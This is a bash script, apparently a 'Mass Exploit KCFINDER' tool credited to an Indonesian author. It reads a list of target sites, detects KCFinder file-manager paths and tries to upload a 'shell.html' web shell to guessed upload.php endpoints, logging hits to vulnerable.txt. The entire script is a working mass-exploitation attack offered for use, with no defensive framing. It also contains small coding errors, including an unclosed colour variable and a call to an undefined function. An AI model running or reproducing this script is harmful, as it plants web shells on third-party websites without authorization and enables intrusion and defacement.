#!/bin/bash
#This colour
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'
clear
cat << "EOF"
 _______________________________________________________________                                  
 8  dP .d88b 8888 888 8b  8 888b. 8888 Yb  dP 888b. 8    .d88b. 
 8wdP  8P    8www  8  8Ybm8 8   8 8www  YbdP  8  .8 8    8P  Y8 
 88Yb  8b    8     8  8  "8 8   8 8     dPYb  8wwP' 8    8b  d8 
 8  Yb `Y88P 8    888 8   8 888P' 8888 dP  Yb 8     8888 `Y88P'
 --------------------------------------------------------------- 
 Mass Exploit KCFINDER Coded By Xnero13-Id
 Github : Github.com/nerogativgit13	
 Youtube : Ganest seven
 ===============================================================
 	
EOF
OPTIONS () {
printf "${lightgreen}[•]${yellow} LIST TARGET : "
read list
kurumi=$(cat $list)
}
OPTIONS
SCAN () {
printf "${lightgreen}[•]============= START SCANNING =============[•]${white}\n"
for kurumi in $(cat $list);
do
	if [[ $(curl --connect-timeout 3 --max-time 3 -kLs "${kurumi}/" ) =~ '/kcfinder/' ]]; then
		printf "${lightgreen}[+] KCFINDER DETECTED:${white} ${kurumi}\n"
		printf "${lightgreen}    >>>>Running Exploit...${white}\n"
		curl=$(curl -s -L -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${kurumi}" > tmp.txt);
		grep=$(cat tmp.txt | grep "/kcfinder/" | grep "${kurumi}" | grep -Po 'src="\K.*?(?=upload)' | sed -n '1p');
		grepsave2=$(cat tmp.txt | grep "/kcfinder/" | grep -Po 'src="\K.*?(?=upload)' | sed -n '1p' > grep.txt);
		linksave=$(printf "${kurumi}" > list.tmp);
		grep2=$(paste -d "" list.tmp grep.txt);
		end1=$(printf "${grep}upload.php");
		printf "        Try Upload from 1. ${end1}\n"
		url1=$(printf "${end1}" > 1.tmp);
		exurl1=$(cat 1.tmp);
			if [[ $(curl -s -i --connect-timeout 5 -F 'img_avatar=@shell.html' "${exurl1}" && echo "${exurl1}" >> vulnerable.txt) =~ 'HTTP/2 200' ]]; then
			printf "                           ${lightgreen}[+] Shell Uploaded\n"
			else
			printf "${red}                           [-] Failed Upload \n"
			fi
		printf "${white}        Try Upload from 2. ${grep2}upload.php\n"
		url2=$(printf "${grep2}" > 2.tmp);
		exurl2=$(cat 2.tmp);
			if [[ $(curl -s -i --connect-timeout 5 -F 'img_avatar=@shell.html' "${exurl2}/upload.php" && echo "${exurl2}" >> vulnerable.txt) =~ 'HTTP/2 200' ]]; then
			printf "                           ${lightgreen}[+] Shell Uploaded\n"
			else
			printf "${red}                           [-] Failed Upload \n"
			fi
	else
		printf "${red}[-] NOT VULN: ${kurumi}\n"
	fi
done
}
SCAN
RETURNS () {
printf "${lightgreen}############## FINISH SCANNING ##############${white}\n"
printf "${yellowY OTHER LIST ? (${lightgreen}Y${white}/${red}N${white}) : "
read return_list
if [[ $return_list == "Y" ]]; then
clear
BANNERS
OPTIONS
SCAN
RETURNS
else
printf "TRIMAKASIH SUDAH MAU MEMAKAI TOOLS KAMI !\n"
printf "JANGAN LUPA SUBSCRIBE CHANELL YOUTUBE GANEST SEVEN\n"
exit
fi
}
RETURNS